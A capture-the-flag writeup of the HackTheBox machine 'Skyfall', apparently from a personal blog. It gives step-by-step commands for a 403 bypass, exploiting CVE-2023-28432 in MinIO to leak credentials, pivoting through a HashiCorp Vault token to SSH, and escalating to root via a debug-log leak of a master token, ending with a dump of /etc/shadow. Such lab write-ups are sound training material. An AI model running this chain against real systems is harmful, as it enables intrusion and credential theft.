---
title: HTB Skyfall Writeup
author: Elus1nist
layout: post
date: 12 January 2023
imagesrc: https://labs.hackthebox.com/storage/avatars/e43c6cdfe71e56188e5c2c4f39f5c180.png
---
Welcome! This is my writeup of the new Season 4 Insane machine from HTB, Skyfall. 

---
---
## Enumerating Services and Open Ports


So to start, as usual we run an nmap TCP port scan:

```
nmap -sC -sV -F -Pn -oN initial_scan 10.10.11.254
```
This gives us the scan results of:

```
Nmap scan report for 10.10.11.254
Host is up (0.062s latency).
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 65:70:f7:12:47:07:3a:88:8e:27:e9:cb:44:5d:10:fb (ECDSA)
|_  256 74:48:33:07:b7:88:9d:32:0e:3b:ec:16:aa:b4:c8:fe (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Skyfall - Introducing Sky Storage!
|_http-server-header: nginx/1.18.0 (Ubuntu)
```

We can see a singular open HTTP port. Not much to go o but good enough, added the virtual host `skyfall.htb` to the `/etc/hosts` file

---
---
## VHost Fuzzing

Knowing HackTheBox one of the first things I try with Web Servers is some Virtual Host Fuzzing

```sh
ffuf -w /opt/SecLists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ -u http://skyfall.htb/ -H Host: FUZZ.skyfall.htb -fs xxx
```

This shows us a possible virtual host of `demo.skyfall.htb`, added this to the `/etc/hosts` file

---
---
## Webpage Enumeration

Visiting the webpage we encounter:
<img src="{{- 'writeup_images/Skyfall/AlternateVHost_Webpage.png' | relative_url}}" >

As suggested, we can login using the credentials `guest : guest`
<img src="{{- 'writeup_images/Skyfall/LoginTo_Demo.png' | relative_url}}" >

---
---
## Bypassing 403 Unauthorized

Wen investigating the web page, I found multiple endpoints. The only endpoint with a `403` code returned was the `/metrics`. Using some auth bypass mechanisms I was finally able to view the page with `http://demo.skyfall.htb/metrics%0a`

<img src="{{- 'writeup_images/Skyfall/Metrics_authBypass.png' | relative_url}}" >

This leaked an important detail - The minio endpoint url
<img src="{{- 'writeup_images/Skyfall/minio_leak.png' | relative_url}}" >

Adding this to `/etc/hosts` file we can access the webpage and the Minio endpoint -
<img src="{{- 'writeup_images/Skyfall/Accessing_MinIO.png' | relative_url}}" >

---
---
## Exploiting Minio

When reading up on Minio public exploits we encounter `CVE-2023-28432`. This is an information disclosure vulnerability. To trigger visit the url endpoint `/minio/bootstrap/v1/verify` and the site returns the following minio setings:

```
"MINIO_ROOT_USER":"5GrE1B2YGGyZzNHZaIww"
"MINIO_ROOT_PASSWORD":"GkpjkmiVmpFuL2d3oRx0"
"MINIO_UPDATE_MINISIGN_PUBKEY":"RWTx5Zr1tiHQLwG9keckT0c45M3AGeHD6IvimQHpyRywVWGbP1aVSGav"
```

Now that we have some data to interact with minio we download the `mc` client (using the docs found [here](ttps://min.io/docs/minio/linux/reference/minio-mc.html)) and use as follows:

```
1) Set alias for minio access
mc set alias testminio_creds http://prd23-s3-backend.skyfall.htb 5GrE1B2YGGyZzNHZaIww GkpjkmiVmpFuL2d3oRx0

2) List resources from minio
mc ls --recursive --versions testminio_creds
```
<img src="{{- 'writeup_images/Skyfall/Minimo_enumeration.png' | relative_url}}" >

```
3) The most important resource is the 3 versions of home_backup.tar.gz. Lets download all 3 versions
mc cp --vid <version_id> myminio/askyy/home_backup.tar.gz ./down.tar.gz
```
One of these zip files leaks the ssh vault by hashicrop is being used

```sh
export VAULT_API_ADDR="http://prd23-vault-internal.skyfall.htb"
export VAULT_TOKEN="hvs.CAESIJlU9JMYEhOPYv4igdhm9PnZDrabYTobQ4Ymnlq1qY-LGh4KHGh2cy43OVRNMnZhakZDRlZGdGVzN09xYkxTQVE"
```

---
---
## Logging in to ssh vault

#### Step 1: Login to vault
```sh
./vault login
```

#### Step 2: Create OTP Key role
```sh
curl --header "X-Vault-Token: $VAULT_TOKEN" --request POST --data '{"ip":"10.10.11.254", "username":"askyy"}' http://prd23-vault-internal.skyfall.htb/v1/ssh/creds/dev_otp_key_role

{
  "request_id": "b119e3d6-15e9-043e-cae2-79183c8700a7",
  "lease_id": "ssh/creds/dev_otp_key_role/xPVWouo7sCaikISm4PysqLMm",
  "renewable": false,
  "lease_duration": 2764800,
  "data": {
    "ip": "10.10.11.254",
    "key": "ef02d28f-e83b-ab0f-cba1-3031439d9599",
    "key_type": "otp",
    "port": 22,
    "username": "askyy"
  },
  "wrap_info": null,
  "warnings": null,
  "auth": null
}
```

#### Step 3: Login to SSH via vault using OTP role
```sh
./vault ssh -role dev_otp_key_role -mode otp askyy@10.10.11.254
```

GIVES US USER FLAG!

---
---
## Privilege Escalation

First we check what sudo permissions our `askyy` user has:

```sh
askyy@skyfall:~$ sudo -l
Matching Defaults entries for askyy on skyfall:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User askyy may run the following commands on skyfall:
    (ALL : ALL) NOPASSWD: /root/vault/vault-unseal -c /etc/vault-unseal.yaml [-vhd]*
    (ALL : ALL) NOPASSWD: /root/vault/vault-unseal -c /etc/vault-unseal.yaml
```

As we can see, the user has the ability to run the vault-unseal command as root. Now running it we can see what it is doing:

```
sudo /root/vault/vault-unseal -c /etc/vault-unseal.yaml -v

[-] Master token found in config: ************
[>] Enable "debug" mode for more details
```

So lets do just that, enabling debug mode would mean providing a file named debug.log.

### 1) Setup debug file and make it owned by askyy
```
touch debug.log
chown askyy:askyy debug.log
```
### 2) Run unseal in debug mode, capturing the Master token
```
sudo /root/vault/vault-unseal -c /etc/vault-unseal.yaml -v -d debug.log
cat debug.log
<Gives us the Master token>
``` 

We can now use this token to login with vault and ssh as done above

---
---
## SSH as root

#### Step 1: Login to vault
```sh
./vault login
```

#### Step 2: Create OTP Key role for admin
```sh
curl --header "X-Vault-Token: $VAULT_TOKEN" --request POST --data '{"ip":"10.10.11.254", "username":"root"}' http://prd23-vault-internal.skyfall.htb/v1/ssh/creds/admin_otp_key_role
```

#### Step 3: Login to SSH via vault using OTP role
```sh
./vault ssh -role admin_otp_key_role -mode otp root@10.10.11.254
```

GIVES US ROOT FLAG!

`/etc/shadow`
```sh
root:$y$j9T$4uH0lUFbgz7XKRP4f/FgP.$gEGN1NQvQhD2aRx452dXMDPZm67IbrFtfzxH.6smSl7:19669:0:99999:7:::
daemon:*:19579:0:99999:7:::
bin:*:19579:0:99999:7:::
sys:*:19579:0:99999:7:::
sync:*:19579:0:99999:7:::
games:*:19579:0:99999:7:::
man:*:19579:0:99999:7:::
lp:*:19579:0:99999:7:::
mail:*:19579:0:99999:7:::
news:*:19579:0:99999:7:::
uucp:*:19579:0:99999:7:::
proxy:*:19579:0:99999:7:::
www-data:*:19579:0:99999:7:::
backup:*:19579:0:99999:7:::
list:*:19579:0:99999:7:::
irc:*:19579:0:99999:7:::
gnats:*:19579:0:99999:7:::
nobody:*:19579:0:99999:7:::
_apt:*:19579:0:99999:7:::
systemd-network:*:19579:0:99999:7:::
systemd-resolve:*:19579:0:99999:7:::
```

<img src="https://giffiles.alphacoders.com/206/206739.gif">
